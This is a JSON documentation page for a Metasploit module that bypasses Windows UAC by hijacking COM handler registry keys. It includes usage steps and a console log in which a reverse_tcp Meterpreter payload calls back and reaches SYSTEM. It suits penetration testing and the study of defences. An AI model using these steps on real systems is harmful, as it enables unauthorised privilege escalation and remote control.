{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/bypassuac_comhijack","result":{"data":{"moduleMetadataJson":{"id":"dcb38a6c-1e03-5db5-ac5d-22ece7261405","name":"Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)","fullname":"exploit/windows/local/bypassuac_comhijack","description":"This module will bypass Windows UAC by creating COM handler registry entries in the\n        HKCU hive. When certain high integrity processes are loaded, these registry entries\n        are referenced resulting in the process loading user-controlled DLLs. These DLLs\n        contain the payloads that result in elevated sessions. Registry key modifications\n        are cleaned up after payload invocation.\n\n        This module requires the architecture of the payload to match the OS, but the\n        current low-privilege Meterpreter session architecture can be different. If\n        specifying EXE::Custom your DLL should call ExitProcess() after starting your\n        payload in a separate process.\n\n        This module invokes the target binary via cmd.exe on the target. Therefore if\n        cmd.exe access is restricted, this module will not run correctly.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/bypassuac_comhijack","documentationSlug":"/modules/documentation/exploit/windows/local/bypassuac_comhijack"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module will bypass UAC on Windows 7 through to 10 RS3 by hijacking a COM Class ID\nthat is located in the current user hive. This key contains a reference to a DLL that\ncontains a chosen payload. Multiple COM vectors are defined in this module and one is\nchosen at random at runtime.</p>\n<p>The module modifies the registry in order for this exploit to work. The modification is\nreverted once the exploitation attempt has finished.</p>\n<p>This module requires that the payload architecture matches the target operating system\narchitecture. This is due to the fact that the underlying binaries that are invoked\nmatch the system architecture.</p>\n<p>If a custom DLL is to be used with <code class=\"language-text\">EXE::Custom</code>, that DLL must match the system\narchitecture, and should call <code class=\"language-text\">ExitProcess()</code> after starting the payload in a\ndifferent process.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<ol>\n<li>Create a session on the target system under the context of a local administrative user.</li>\n<li>Begin interacting with the module: <code class=\"language-text\">use exploit/windows/local/bypassuac_comhijack</code>.</li>\n<li>Set the <code class=\"language-text\">PAYLOAD</code> and configure it correctly, making sure the architecture is correct.</li>\n<li>If an existing handler is configured to receive the elevated session, then the module's\nhandler should be disabled: <code class=\"language-text\">set DisablePayloadHandler true</code>.</li>\n<li>Make sure that the <code class=\"language-text\">SESSION</code> value is set to the existing session identifier.</li>\n<li>Invoke the module: <code class=\"language-text\">run</code>.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(bypassuac_comhijack) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Type                     Information                           Connection\n  --  ----                     -----------                           ----------\n  1   meterpreter x64/windows  DESKTOP-5A73R51\\oj @ DESKTOP-5A73R51  xxx.xx.255.1:8443 -&gt; xxx.xx.255.159:51474 (xxx.xx.255.159)\n\nmsf exploit(bypassuac_comhijack) &gt; sessions -1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-5A73R51\nOS              : Windows 10 (Build 14393).\nArchitecture    : x64\nSystem Language : en_AU\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\n\nmeterpreter &gt; getsystem\n[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf exploit(bypassuac_comhijack) &gt; options\n\nModule options (exploit/windows/local/bypassuac_comhijack):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     xxx.xx.255.1     yes       The listen address\n   LPORT     8443             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf exploit(bypassuac_comhijack) &gt; run\n\n[*] [2017.08.16-12:58:31] UAC is Enabled, checking level...\n[+] [2017.08.16-12:58:31] Part of Administrators group! Continuing...\n[+] [2017.08.16-12:58:32] UAC is set to Default\n[+] [2017.08.16-12:58:32] BypassUAC can bypass this setting, continuing...\n[*] [2017.08.16-12:58:33] Targeting Event Viewer via HKCU\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931} ...\n[*] [2017.08.16-12:58:33] Uploading payload to C:\\Users\\oj\\AppData\\Local\\Temp\\DJAyEYXA.dll ...\n[*] [2017.08.16-12:58:33] Executing high integrity process ...\n[*] [2017.08.16-12:58:34] Sending stage (1188415 bytes) to xxx.xx.255.159\n[*] Meterpreter session 2 opened (xxx.xx.255.1:8443 -&gt; xxx.xx.255.159:51480) at 2017-08-16 12:58:35 +1000\n[*] [2017.08.16-12:58:38] Cleaining up registry ...\n[!] [2017.08.16-12:58:39] This exploit may require manual cleanup of &#39;C:\\Users\\oj\\AppData\\Local\\Temp\\DJAyEYXA.dll&#39; on the target\nmsf exploit(bypassuac_comhijack) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Type                     Information                           Connection\n  --  ----                     -----------                           ----------\n  1   meterpreter x64/windows  DESKTOP-5A73R51\\oj @ DESKTOP-5A73R51  xxx.xx.255.1:8443 -&gt; xxx.xx.255.159:51474 (xxx.xx.255.159)\n  2   meterpreter x64/windows  DESKTOP-5A73R51\\oj @ DESKTOP-5A73R51  xxx.xx.255.1:8443 -&gt; xxx.xx.255.159:51480 (xxx.xx.255.159)\n\nmsf exploit(bypassuac_comhijack) &gt; sessions -1\n[*] Starting interaction with 2...\n\nmeterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"dcb38a6c-1e03-5db5-ac5d-22ece7261405"}}}